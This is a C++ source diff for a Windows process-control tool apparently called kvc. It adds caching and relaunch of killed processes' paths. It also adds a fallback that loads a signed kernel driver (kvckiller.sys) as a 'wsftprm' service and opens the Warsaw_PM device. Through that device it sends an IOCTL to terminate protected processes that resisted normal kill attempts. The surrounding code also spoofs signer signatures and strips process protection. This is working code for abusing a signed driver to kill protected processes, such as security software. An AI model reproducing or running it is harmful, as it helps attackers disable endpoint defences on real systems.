@@ -10,6 +10,117 @@ extern volatile bool g_interrupted;
 
 static void GetOptimalSpoofSignatures(UCHAR signerType, UCHAR& outExeSig, UCHAR& outDllSig) noexcept;
 
+// ── Killed-process path cache (HKCU\Software\kvc\KilledPaths) ───────────────
+
+static void CacheKilledProcessPath(const std::wstring& exeName,
+                                    const std::wstring& fullPath) noexcept
+{
+    std::wstring key = exeName;
+    StringUtils::ToLower(key);
+    HKEY hKey = nullptr;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\KilledPaths",
+                        0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                        nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
+        const DWORD sz = static_cast<DWORD>((fullPath.size() + 1) * sizeof(wchar_t));
+        RegSetValueExW(hKey, key.c_str(), 0, REG_SZ,
+                       reinterpret_cast<const BYTE*>(fullPath.c_str()), sz);
+        RegCloseKey(hKey);
+    }
+}
+
+static std::wstring GetCachedKilledProcessPath(std::wstring exeName) noexcept
+{
+    StringUtils::ToLower(exeName);
+    if (exeName.size() < 4 ||
+        exeName.compare(exeName.size() - 4, 4, L".exe") != 0)
+        exeName += L".exe";
+
+    HKEY hKey = nullptr;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\KilledPaths",
+                      0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
+        return {};
+
+    wchar_t buf[MAX_PATH] = {};
+    DWORD sz = sizeof(buf), type = 0;
+    LONG r = RegQueryValueExW(hKey, exeName.c_str(), nullptr, &type,
+                               reinterpret_cast<LPBYTE>(buf), &sz);
+    RegCloseKey(hKey);
+    return (r == ERROR_SUCCESS && type == REG_SZ) ? buf : L"";
+}
+
+static bool TryRelaunchKilledProcess(const std::wstring& name) noexcept
+{
+    std::wstring exeName = name;
+    if (exeName.size() < 4 ||
+        _wcsicmp(exeName.c_str() + exeName.size() - 4, L".exe") != 0)
+        exeName += L".exe";
+    std::wstring lowerExe = exeName;
+    StringUtils::ToLower(lowerExe);
+
+    // Step 1: find a Win32 service whose ImagePath contains the exe name and start it.
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr,
+                                     SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
+    if (hSCM) {
+        DWORD needed = 0, returned = 0, resumeHandle = 0;
+        EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
+                               SERVICE_STATE_ALL, nullptr, 0,
+                               &needed, &returned, &resumeHandle, nullptr);
+        if (GetLastError() == ERROR_MORE_DATA) {
+            std::vector<BYTE> buf(needed);
+            auto* svcs = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buf.data());
+            resumeHandle = 0;
+            if (EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
+                                       SERVICE_STATE_ALL, buf.data(), needed,
+                                       &needed, &returned, &resumeHandle, nullptr)) {
+                for (DWORD i = 0; i < returned; ++i) {
+                    SC_HANDLE hSvc = OpenServiceW(hSCM, svcs[i].lpServiceName,
+                                                   SERVICE_QUERY_CONFIG | SERVICE_START);
+                    if (!hSvc) continue;
+                    DWORD cfgBytes = 0;
+                    QueryServiceConfigW(hSvc, nullptr, 0, &cfgBytes);
+                    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+                        std::vector<BYTE> cfgBuf(cfgBytes);
+                        auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(cfgBuf.data());
+                        if (QueryServiceConfigW(hSvc, cfg, cfgBytes, &cfgBytes)) {
+                            std::wstring bin = cfg->lpBinaryPathName;
+                            StringUtils::ToLower(bin);
+                            if (bin.find(lowerExe) != std::wstring::npos) {
+                                bool ok = StartServiceW(hSvc, 0, nullptr) ||
+                                          GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
+                                CloseServiceHandle(hSvc);
+                                CloseServiceHandle(hSCM);
+                                if (ok) { SUCCESS(L"Relaunched %s via service", name.c_str()); return true; }
+                                break;
+                            }
+                        }
+                    }
+                    CloseServiceHandle(hSvc);
+                }
+            }
+        }
+        CloseServiceHandle(hSCM);
+    }
+
+    // Step 2: fall back to cached exe path stored at kill time.
+    const std::wstring path = GetCachedKilledProcessPath(name);
+    if (path.empty()) {
+        INFO(L"No cached path for %s — cannot relaunch", name.c_str());
+        return false;
+    }
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"runas";
+    sei.lpFile = path.c_str();
+    sei.nShow  = SW_NORMAL;
+    if (ShellExecuteExW(&sei)) {
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+        SUCCESS(L"Relaunched %s", name.c_str());
+        return true;
+    }
+    INFO(L"ShellExecuteEx failed for %s: %lu", name.c_str(), GetLastError());
+    return false;
+}
+
 #include <iomanip> // Required for std::setw
 
 // Table formatting constants and utilities for process list display
@@ -362,7 +473,36 @@ bool Controller::KillMultipleTargets(const std::vector<std::wstring>& targets) n
         EndDriverSession(true);
         return false;
     }
-    
+
+    // Snapshot exe name + full path for every target PID while the process is alive.
+    std::unordered_map<DWORD, std::pair<std::wstring, std::wstring>> pidInfo;
+    {
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe{ sizeof(pe) };
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    for (DWORD pid : allPids) {
+                        if (pe.th32ProcessID == pid && pidInfo.find(pid) == pidInfo.end()) {
+                            std::wstring exeName = pe.szExeFile;
+                            std::wstring fullPath;
+                            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
+                                                       FALSE, pid);
+                            if (hProc) {
+                                wchar_t buf[MAX_PATH] = {}; DWORD sz = MAX_PATH;
+                                if (QueryFullProcessImageNameW(hProc, 0, buf, &sz))
+                                    fullPath = buf;
+                                CloseHandle(hProc);
+                            }
+                            pidInfo[pid] = { exeName, fullPath };
+                        }
+                    }
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+    }
+
     INFO(L"Starting batch kill operation for %d resolved processes", allPids.size());
     DWORD successCount = 0;
     std::vector<DWORD> failedPids;
@@ -376,6 +516,9 @@ bool Controller::KillMultipleTargets(const std::vector<std::wstring>& targets) n
         if (KillProcessInternal(pid, true)) {
             successCount++;
             SUCCESS(L"Successfully terminated PID %d", pid);
+            if (auto it = pidInfo.find(pid);
+                it != pidInfo.end() && !it->second.second.empty())
+                CacheKilledProcessPath(it->second.first, it->second.second);
         } else {
             failedPids.push_back(pid);
         }
@@ -383,22 +526,80 @@ bool Controller::KillMultipleTargets(const std::vector<std::wstring>& targets) n
 
     EndDriverSession(true);
 
-    // kvcstrm fallback for any PIDs that survived usermode kill — outside driver session
+    // kvckiller fallback for any PIDs that survived the kvc.sys session.
+    // kvckiller.sys is digitally signed — no HVCI restart required.
     if (!failedPids.empty()) {
-        bool autoStarted = false;
-        if (EnsureStrmOpen(autoStarted)) {
-            for (DWORD pid : failedPids) {
-                if (m_strm.KillProcessLegacy(pid)) {
-                    SUCCESS(L"PID %d terminated via kvcstrm", pid);
-                    successCount++;
-                } else {
-                    INFO(L"PID %d not terminated (process may no longer exist)", pid);
+        PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);
+        const std::wstring killerPath = GetDriverStorePath() + L"\\kvckiller.sys";
+
+        if (GetFileAttributesW(killerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            // Remove stale wsftprm registration.
+            {
+                SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+                if (hSCM) {
+                    SC_HANDLE hOld = OpenServiceW(hSCM, L"wsftprm", DELETE);
+                    if (hOld) { DeleteService(hOld); CloseServiceHandle(hOld); }
+                    CloseServiceHandle(hSCM);
                 }
             }
-            CleanupStrm(autoStarted);
+
+            SC_HANDLE hKillerSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+            SC_HANDLE hKillerSvc = nullptr;
+            bool killerLoaded = false;
+
+            if (hKillerSCM) {
+                hKillerSvc = CreateServiceW(hKillerSCM, L"wsftprm", L"wsftprm",
+                                            SERVICE_START | SERVICE_STOP | DELETE,
+                                            SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+                                            SERVICE_ERROR_NORMAL, killerPath.c_str(),
+                                            nullptr, nullptr, nullptr, nullptr, nullptr);
+                if (hKillerSvc && StartServiceW(hKillerSvc, 0, nullptr))
+                    killerLoaded = true;
+            }
+
+            if (killerLoaded) {
+                HANDLE hDev = CreateFileW(L"\\\\.\\Warsaw_PM",
+                                          GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+                                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+                if (hDev != INVALID_HANDLE_VALUE) {
+                    for (DWORD pid : failedPids) {
+                        std::vector<BYTE> buf(1036, 0);
+                        *reinterpret_cast<DWORD*>(buf.data()) = pid;
+                        DWORD ret = 0;
+                        if (DeviceIoControl(hDev, 0x22201C,
+                                            buf.data(), static_cast<DWORD>(buf.size()),
+                                            nullptr, 0, &ret, nullptr)) {
+                            SUCCESS(L"PID %d terminated via kvckiller", pid);
+                            successCount++;
+                            if (auto it = pidInfo.find(pid);
+                                it != pidInfo.end() && !it->second.second.empty())
+                                CacheKilledProcessPath(it->second.first, it->second.second);
+                        } else {
+                            INFO(L"PID %d not terminated (kvckiller IOCTL failed: %lu)", pid, GetLastError());
+                        }
+                    }
+                    CloseHandle(hDev);
+                } else {
+                    for (DWORD pid : failedPids)
+                        INFO(L"PID %d not terminated (Warsaw_PM unavailable: %lu)", pid, GetLastError());
+                }
+
+                // Cleanup: stop + delete wsftprm
+                if (hKillerSvc) {
+                    SERVICE_STATUS ss{};
+                    ControlService(hKillerSvc, SERVICE_CONTROL_STOP, &ss);
+                    DeleteService(hKillerSvc);
+                }
+            } else {
+                for (DWORD pid : failedPids)
+                    INFO(L"PID %d not terminated (kvckiller service failed to start)", pid);
+            }
+
+            if (hKillerSvc)  CloseServiceHandle(hKillerSvc);
+            if (hKillerSCM) CloseServiceHandle(hKillerSCM);
         } else {
             for (DWORD pid : failedPids)
-                INFO(L"PID %d not terminated (kvcstrm unavailable)", pid);
+                INFO(L"PID %d not terminated (kvckiller.sys not found)", pid);
         }
     }
 
@@ -868,7 +1069,7 @@ bool Controller::UnprotectAllProcesses() noexcept
 }
 
 // Restores protection for processes unprotected by signer
-bool Controller::RestoreProtectionBySigner(const std::wstring& signerName) noexcept 
+bool Controller::RestoreProtectionBySigner(const std::wstring& signerName) noexcept
 {
     if (!BeginDriverSession()) {
         EndDriverSession(true);
@@ -876,6 +1077,8 @@ bool Controller::RestoreProtectionBySigner(const std::wstring& signerName) noexc
     }
     bool result = m_sessionMgr.RestoreBySigner(signerName, this);
     EndDriverSession(true);
+    if (!result)
+        result = TryRelaunchKilledProcess(signerName);
     return result;
 }
 
